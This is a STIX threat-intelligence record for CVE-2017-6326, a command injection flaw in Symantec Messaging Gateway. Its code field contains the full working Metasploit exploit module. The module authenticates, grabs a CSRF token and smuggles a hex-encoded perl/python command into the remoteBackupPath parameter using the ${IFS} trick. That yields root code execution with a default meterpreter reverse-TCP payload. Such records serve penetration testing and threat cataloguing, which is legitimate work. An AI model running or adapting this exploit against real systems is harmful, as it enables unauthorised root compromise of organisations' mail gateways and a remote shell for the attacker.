{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ce437b8c-0ee8-4cc4-af38-a0cf165e8965",
    "created": "2024-08-14T17:02:45.485954Z",
    "modified": "2024-08-14T17:02:45.485958Z",
    "name": "\"Symantec Messaging Gateway Remote Code Execution\"",
    "description": " This module exploits the command injection vulnerability of Symantec Messaging Gateway product. An authenticated user can execute a terminal command under the context of the web server user which is root.  backupNow.do endpoint takes several user inputs and then pass them to the internal service which is responsible for executing operating system command. One of the user input is being passed to the service without proper validation. That cause a command injection vulnerability. But given parameters, such a SSH ip address, port and credentials are validated before executing terminal command. Thus, you need to configure your own SSH service and set the required parameter during module usage.  This module was tested against Symantec Messaging Gateway 10.6.2-7.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/symantec_messaging_gateway_exec.rb",
            "external_id": "symantec_messaging_gateway_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://pentest.blog/unexpected-journey-5-from-weak-password-to-rce-on-symantec-messaging-gateway/"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-6326"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Symantec Messaging Gateway Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits the command injection vulnerability of Symantec Messaging Gateway product. An authenticated user can execute a\n        terminal command under the context of the web server user which is root.\n\n        backupNow.do endpoint takes several user inputs and then pass them to the internal service which is responsible for executing\n        operating system command. One of the user input is being passed to the service without proper validation. That cause a command\n        injection vulnerability. But given parameters, such a SSH ip address, port and credentials are validated before executing terminal\n        command. Thus, you need to configure your own SSH service and set the required parameter during module usage.\n\n        This module was tested against Symantec Messaging Gateway 10.6.2-7.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Mehmet Ince <mehmet@mehmetince.net>' # author & msf module\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://pentest.blog/unexpected-journey-5-from-weak-password-to-rce-on-symantec-messaging-gateway/'],\n          ['CVE', '2017-6326']\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true,\n          'RPORT' => 443,\n          'Payload' => 'python/meterpreter/reverse_tcp'\n        },\n      'Platform'       => ['python'],\n      'Arch'           => ARCH_PYTHON,\n      'Targets'        => [[ 'Automatic', { }]],\n      'Privileged'     => true,\n      'DisclosureDate' => '2017-04-26',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('USERNAME', [true, 'The username to login as']),\n        OptString.new('PASSWORD', [true, 'The password to login with']),\n        OptString.new('SSH_ADDRESS', [true, 'The ip address of your SSH service']),\n        OptInt.new('SSH_PORT', [true, 'The port of your SSH service', 22]),\n        OptString.new('SSH_USERNAME', [true, 'The username of your SSH service']),\n        OptString.new('SSH_PASSWORD', [true, 'The password of your SSH service']),\n        OptString.new('TARGETURI', [true, 'The base path to Symantec Messaging Gateway', '/'])\n      ]\n    )\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def ssh_address\n    datastore['SSH_ADDRESS']\n  end\n\n  def ssh_port\n    datastore['SSH_PORT']\n  end\n\n  def ssh_username\n    datastore['SSH_USERNAME']\n  end\n\n  def ssh_password\n    datastore['SSH_PASSWORD']\n  end\n\n  def auth\n    print_status(\"Performing authentication...\")\n\n    sid        = ''\n    last_login = ''\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'brightmail', 'viewLogin.do')\n    })\n\n    if res && !res.get_cookies.empty?\n      last_login = res.get_hidden_inputs.first['lastlogin'] || ''\n      sid = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || ''\n    else\n      fail_with(Failure::Unknown, \"Didn't get cookie-set header from response.\")\n    end\n\n    cookie = ''\n\n    # Performing authentication\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'brightmail', 'login.do'),\n      'headers'   => {\n        'Referer' => \"https://#{peer}/brightmail/viewLogin.do\",\n        'Connection' => 'keep-alive'\n      },\n      'cookie'    => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}\",\n      'vars_post' => {\n        'lastlogin'  => last_login,\n        'userLocale' => '',\n        'lang'       => 'en_US',\n        'username'   => username,\n        'password'   => password,\n        'loginBtn'   => 'Login'\n      }\n    })\n\n    if res &&res.body =~ /Logged in/\n      cookie = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0]\n      print_good(\"Awesome..! Authenticated with #{username}:#{password}\")\n    else\n      fail_with(Failure::Unknown, 'Credentials are not valid.')\n    end\n\n    cookie\n  end\n\n  def get_csrf_token(cookie)\n\n    print_status('Capturing CSRF token')\n\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, 'brightmail', 'admin', 'backup', 'backupNow.do'),\n      'cookie'    => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{cookie}\",\n    })\n\n    csrf_token = nil\n    if res && res.code == 200\n      match = res.body.match(/type=\"hidden\" name=\"symantec.brightmail.key.TOKEN\" value=\"(\\w+)\"\\/>/)\n      if match\n        csrf_token = match[1]\n        print_good(\"CSRF token is : #{csrf_token}\")\n      else\n        fail_with(Failure::Unknown, 'There is no CSRF token at HTTP response.')\n      end\n    else\n      fail_with(Failure::Unknown, 'Something went wrong.')\n    end\n\n    csrf_token\n  end\n\n  def exploit\n\n    cookie = auth\n    csrf_token = get_csrf_token(cookie)\n\n    # I want to get meterpreter instead of cmd shell but SPACE and some other characters are blacklisted.\n    # Note that, we always have one SPACE at the beginning of python payload. e.g: import base64,sys;\n    # Here is the thing, use perl payload with ${IFS} technique and deliver the real payload inside of it :)\n    # So we gonna execute a perl payload on server side which will execute our meterpreter python payload.\n\n    cmd = \"python -c \\\"#{payload.encoded}\\\"\"\n    final_payload = cmd.to_s.unpack(\"H*\").first\n\n    p = \"perl${IFS}-e${IFS}'system(pack(qq,H#{final_payload.length},,qq,#{final_payload},))'\"\n\n    # Ok. We are ready to go\n    send_request_cgi({\n    'method'    => 'POST',\n    'uri'       => normalize_uri(target_uri.path, 'brightmail', 'admin', 'backup', 'performBackupNow.do'),\n    'cookie'    => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{cookie}\",\n    'vars_post' => {\n      'pageReuseFor'                        => 'backup_now',\n      'id'                                  => '',\n      'symantec.brightmail.key.TOKEN'       => csrf_token,\n      'backupData'                          => 'full',\n      'customType'                          => 'configuration',\n      'includeIncidentMessages'             => 'true',\n      'includeLogData'                      => 'true',\n      'backupTo'                            => '2',\n      'remoteBackupProtocol'                => 'SCP',\n      'remoteBackupAddress'                 => ssh_address,\n      'remoteBackupPort'                    => ssh_port,\n      'remoteBackupPath'                    => \"tmp$(#{p})\",\n      'requiresRemoteAuthentication'        => 'true',\n      'remoteBackupUsername'                => ssh_username,\n      'remoteBackupPassword'                => ssh_password,\n      }\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-04-26",
    "x_mitre_platforms": [
        "['python']"
    ]
}